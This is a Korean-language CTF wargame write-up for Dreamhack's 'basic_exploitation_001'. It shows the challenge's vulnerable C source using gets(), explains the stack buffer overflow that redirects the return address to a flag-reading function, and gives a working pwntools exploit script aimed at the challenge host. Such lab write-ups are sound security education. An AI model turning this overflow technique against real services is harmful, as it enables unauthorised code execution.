## 📍basic_exploitation_001

```
이 문제는 서버에서 작동하고 있는 서비스(basic_exploitation_001)의 바이너리와 소스 코드가 주어집니다.  
프로그램의 취약점을 찾고 익스플로잇해 "flag" 파일을 읽으세요.  
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.  
플래그의 형식은 DH{...} 입니다.
```

```
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```


### 소스코드

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
	
    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {
    char buf[0x80];
    initialize();
    gets(buf);
    return 0;
}
```

![[{8C48088D-2EA8-4291-9662-01C8E1925881}.png]]

![[{6B5CA851-367C-469D-A02D-8A4961104865}.png]]

`read_flag` 함수의 시작 주소: `0x080485b9`

`gets` 함수에서 입력의 크기를 제한하고 있지 않기 때문에 버퍼 오버플로우 공격이 가능하다.
128바이트의 버퍼와 4바이트의 EBP(Extended Base Pointer)를 더미 데이터로 채우고, 그 이후 호출된 위치로 돌아갈 때 RET로 `read_flag` 함수의 시작 주소를 주면 `read_flag` 함수를 실행할 수 있다.


`$ python3 be1.py`

```python
from pwn import *

conn = remote('host3.dreamhack.games', 11943)

payload = b'A' * 0x84
payload += p32(0x080485b9)

conn.sendline(payload)

conn.interactive()
```

![[{6C625355-E5B7-438B-A7AB-7D20F3DB1A8E}.png]]

🚩